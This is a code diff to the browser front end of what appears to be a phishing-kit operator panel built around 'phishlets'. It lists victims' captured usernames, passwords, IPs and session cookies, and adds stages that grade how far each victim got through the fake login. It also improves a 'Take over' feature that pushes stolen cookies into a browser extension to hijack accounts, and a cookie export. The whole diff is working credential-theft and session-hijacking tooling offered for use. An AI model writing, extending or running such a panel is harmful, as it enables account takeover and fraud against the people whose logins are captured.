@@ -55,7 +55,7 @@ var API = {
 
 var S = {
   sessions: [], total: 0, stats: null,
-  q: { search: '', phishlet: '', tokens: '', sort: 'create_time', dir: 'desc' },
+  q: { search: '', phishlet: '', tokens: '', stage: '', sort: 'create_time', dir: 'desc' },
   pageNum: 0, pageSize: 25,
   selected: {}, timer: null, ext: false, cur: null
 };
@@ -115,11 +115,13 @@ function statCard(icon, label, value, sub, tone) {
 function statStrip() {
   var s = S.stats || {};
   var total = s.total_sessions || 0;
-  var pct = total ? Math.round((s.with_tokens || 0) / total * 100) : 0;
+  var auth = s.authenticated || 0;
+  var partial = s.partial || 0;
+  var pct = total ? Math.round(auth / total * 100) : 0;
   return '<div class="grid stats mb14">' +
-    statCard('sessions', 'Sessions', total, 'captured so far', '') +
-    statCard('key', 'With tokens', s.with_tokens || 0, pct + '% of sessions', 'hot') +
-    statCard('globe', 'Unique IPs', s.unique_ips || 0, 'distinct sources', '') +
+    statCard('shield', 'Authenticated', auth, pct + '% of sessions', auth ? 'live' : '') +
+    statCard('key', 'Partial', partial, 'email or password only', partial ? 'hot' : '') +
+    statCard('sessions', 'Sessions', total, 'total seen', '') +
     statCard('activity', 'Active now', s.active_sessions || 0, 'seen in the last 5 min', s.active_sessions ? 'live' : '') +
   '</div>';
 }
@@ -131,14 +133,14 @@ async function render() {
     renderChrome();
     var q = 'limit=' + S.pageSize + '&offset=' + (S.pageNum * S.pageSize) +
       '&search=' + encodeURIComponent(S.q.search) + '&phishlet=' + encodeURIComponent(S.q.phishlet) +
-      '&tokens=' + encodeURIComponent(S.q.tokens) + '&sort=' + S.q.sort + '&dir=' + S.q.dir;
+      '&stage=' + encodeURIComponent(S.q.stage) + '&sort=' + S.q.sort + '&dir=' + S.q.dir;
     var d = await API.get('/api/v1/sessions?' + q);
     S.sessions = d.sessions; S.total = d.total;
     pushSessions();
     var pages = Math.max(1, Math.ceil(d.total / S.pageSize));
     var phopts = (d.phishlets || []).map(function (p) { return '<option value="' + esc(p) + '"' + (S.q.phishlet === p ? ' selected' : '') + '>' + esc(p) + '</option>'; }).join('');
-    var toks = [['', 'All tokens'], ['yes', 'With tokens'], ['no', 'No tokens']].map(function (t) {
-      return '<option value="' + t[0] + '"' + (S.q.tokens === t[0] ? ' selected' : '') + '>' + t[1] + '</option>';
+    var stages = [['', 'All stages'], ['usable', 'Authenticated only'], ['partial', 'Email / password only'], ['credentials', 'Password entered'], ['email', 'Email only'], ['visited', 'Visited only']].map(function (t) {
+      return '<option value="' + t[0] + '"' + (S.q.stage === t[0] ? ' selected' : '') + '>' + t[1] + '</option>';
     }).join('');
 
     $('#content').innerHTML =
@@ -146,7 +148,7 @@ async function render() {
       '<div class="toolbar">' +
         '<div class="search grow"><input id="fSearch" placeholder="Search username, password, IP, user-agent…" value="' + esc(S.q.search) + '"></div>' +
         '<select id="fPl" style="width:auto"><option value="">All phishlets</option>' + phopts + '</select>' +
-        '<select id="fTok" style="width:auto">' + toks + '</select>' +
+        '<select id="fStage" style="width:auto">' + stages + '</select>' +
         '<span class="dim mono">' + d.total + ' result' + (d.total === 1 ? '' : 's') + '</span>' +
       '</div>' +
       '<div class="card pad0">' + sessionsTable(d.sessions) + '</div>' +
@@ -162,10 +164,17 @@ async function render() {
 
     var f = $('#fSearch'); if (f) f.oninput = function () { S.q.search = this.value; S.pageNum = 0; debounce(render, 280); };
     var p = $('#fPl'); if (p) p.onchange = function () { S.q.phishlet = this.value; S.pageNum = 0; render(); };
-    var t = $('#fTok'); if (t) t.onchange = function () { S.q.tokens = this.value; S.pageNum = 0; render(); };
+    var st = $('#fStage'); if (st) st.onchange = function () { S.q.stage = this.value; S.pageNum = 0; render(); };
   } catch (e) {
     $('#content').innerHTML = '<div class="empty"><div class="big">⚠</div>' + esc(e.message || e) + '</div>';
   }
+}
+function stageBadge(s) {
+  var st = s.stage === undefined ? 0 : s.stage;
+  if (st >= 3) return '<span class="badge ok" title="login completed, cookies are usable">auth</span>';
+  if (st === 2) return '<span class="badge acc" title="credentials entered but the provider never confirmed the login">password only</span>';
+  if (st === 1) return '<span class="badge mut" title="only the email was submitted">email only</span>';
+  return '<span class="badge mut" style="opacity:.7" title="landed, nothing submitted">visited</span>';
 }
 function sessionsTable(list) {
   if (!list.length) return '<div class="empty"><div class="big">◌</div>No sessions yet.</div>';
@@ -183,7 +192,7 @@ function sessionsTable(list) {
       '<td class="mono">' + (s.password ? '<span class="copy" data-act="copy" data-copy="' + esc(s.password) + '">' + esc(s.password) + '</span>' : '<span class="dim">--</span>') + '</td>' +
       '<td class="mono">' + esc(s.remote_addr) + '</td>' +
       '<td class="trunc">' + esc(geo || '--') + '</td>' +
-      '<td>' + (s.has_tokens ? '<span class="badge ok">captured</span>' : '<span class="badge mut">none</span>') + '</td>' +
+      '<td>' + stageBadge(s) + '</td>' +
       '<td class="dim" title="' + esc(fmtTime(s.create_time)) + '">' + ago(s.create_time) + '</td>' +
       '<td class="right"><button class="btn xs" data-act="sess" data-id="' + s.id + '">Open</button></td>' +
       '</tr>';
@@ -202,18 +211,20 @@ function closeDrawer() { $('#drawer').classList.remove('open'); $('#scrim').clas
 async function openSession(id) {
   var s = await API.get('/api/v1/sessions/' + id);
   S.cur = s;
-  window.postMessage({ type: 'SESSION_SELECT', payload: { sessionId: s.id, phishlet: s.phishlet, hasTokens: s.has_tokens } }, '*');
+  window.postMessage({ type: 'SESSION_SELECT', payload: { sessionId: s.id, phishlet: s.phishlet, hasTokens: s.has_tokens, stage: s.stage, usable: s.usable } }, '*');
   var geo = s.geo ? ((s.geo.city ? s.geo.city + ', ' : '') + (s.geo.country || '') + (s.geo.isp ? ' · ' + s.geo.isp : '') + (s.geo.vpn ? ' [VPN]' : '') + (s.geo.datacenter ? ' [DC]' : '')) : '-';
   var tok = s.tokens && Object.keys(s.tokens).length ? JSON.stringify(s.tokens, null, 2) : '(none)';
   var body = '<div class="kv">' +
       row('Username', s.username || '-', s.username) + row('Password', s.password || '-', s.password) +
+      row('Status', (s.stage_name || 'visited') + (s.usable ? '' : ' (not confirmed)')) +
       row('IP', s.remote_addr || '-') + row('Location', geo) +
       row('Captured', fmtTime(s.create_time)) + row('Landing URL', s.landing_url || '-') +
     '</div>' +
+    (s.usable ? '' : '<div class="note mt8">The provider never confirmed the login, so these cookies may not sign in. Worth trying only if the victim got as far as the password page.</div>') +
     '<div class="field mt14"><label>User agent</label><div class="pre">' + esc(s.useragent || '-') + '</div></div>' +
-    '<div class="field"><label>Cookies ' + (s.has_tokens ? '<span class="badge ok">' + s.token_count + ' captured</span>' : '<span class="badge mut">none</span>') + '</label><div class="pre">' + esc(tok) + '</div></div>';
+    '<div class="field"><label>Cookies ' + (s.has_tokens ? '<span class="badge ' + (s.usable ? 'ok' : 'mut') + '">' + s.token_count + ' stored</span>' : '<span class="badge mut">none</span>') + '</label><div class="pre">' + esc(tok) + '</div></div>';
   openDrawer('Session #' + s.id + ' · ' + esc(s.phishlet), body,
-    (s.has_tokens ? '<button class="btn sm primary" data-act="inject" data-id="' + s.id + '">Take over</button>' : '') +
+    (s.has_tokens && s.stage >= 2 ? '<button class="btn sm ' + (s.usable ? 'primary' : '') + '" data-act="inject" data-id="' + s.id + '">Take over</button>' : '') +
     '<button class="btn sm" data-act="sess-export" data-id="' + s.id + '">Cookies JSON</button>' +
     '<button class="btn sm danger" data-act="sess-del" data-id="' + s.id + '">Delete</button>');
   function row(k, v, copyv) {
@@ -223,6 +234,12 @@ async function openSession(id) {
 
 /* ---------------- inject (extension bridge) ---------------- */
 document.addEventListener('ext-ready', function () { S.ext = true; pushSessions(); });
+// The extension was reloaded/updated: this tab's content script is now dead.
+document.addEventListener('ext-gone', function () {
+  if (!S.ext) return;
+  S.ext = false;
+  toast('Extension was reloaded - refresh this page to reconnect', 'err');
+});
 window.addEventListener('inject-result', function (e) {
   var r = e.detail || {}; var el = $('#injResult');
   if (!el) return;
@@ -237,7 +254,7 @@ function pushSessions() {
   window.postMessage({
     type: 'SESSIONS',
     payload: S.sessions.map(function (s) {
-      return { id: s.id, username: s.username, phishlet: s.phishlet, has_tokens: s.has_tokens, ip: s.remote_addr, time: s.create_time };
+      return { id: s.id, username: s.username, phishlet: s.phishlet, has_tokens: s.has_tokens, usable: !!s.usable, stage: s.stage | 0, ip: s.remote_addr, time: s.create_time };
     })
   }, '*');
 }
@@ -245,9 +262,11 @@ async function inject(id) {
   var d = await API.get('/api/v1/sessions/' + id + '/cookies');
   if (!d.count) { toast('No cookies to inject', 'err'); return; }
   S.injectPayload = d;
+  var sess = (S.sessions || []).filter(function (x) { return String(x.id) === String(id); })[0];
   if (S.ext) {
     openModal('Session takeover',
       '<p class="muted mb14">Sending <b>' + d.count + '</b> cookies to the browser extension. It opens the target in the window you have configured (incognito or normal profile), so your own logins are left alone in incognito mode.</p>' +
+      (sess && !sess.usable ? '<div class="note warn mb14">This session is <b>' + esc(sess.stage_name || 'not authenticated') + '</b>. The provider never confirmed the login, so the cookies may not sign in.</div>' : '') +
       '<div id="injResult"><span class="dim">working…</span></div>' +
       '<div class="hint mt14 mb8">Open in:</div>' +
       '<div class="actions"><button class="btn sm" data-act="inj" data-mode="incognito">Incognito window</button>' +
